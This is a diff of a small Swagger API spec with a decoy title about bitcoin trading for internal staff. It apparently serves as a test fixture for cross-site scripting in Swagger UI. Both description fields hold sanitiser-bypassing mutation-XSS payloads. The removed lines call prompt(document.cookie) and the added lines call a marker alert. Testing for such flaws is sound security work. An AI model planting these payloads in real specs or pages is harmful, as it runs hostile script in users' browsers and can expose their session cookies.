@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Comercio de Bitcoins para funcionarios internos
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src/onerror=prompt(document.cookie)></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('WebJars_Swagger_XSS') src=1>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><TESTE><path id="</TESTE><img src/onerror=prompt(document.cookie)>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><TESTE><path id="</TESTE><img onerror=alert('WebJars_Swagger_XSS') src=1>"></form>
 
           format: int64
           in: path
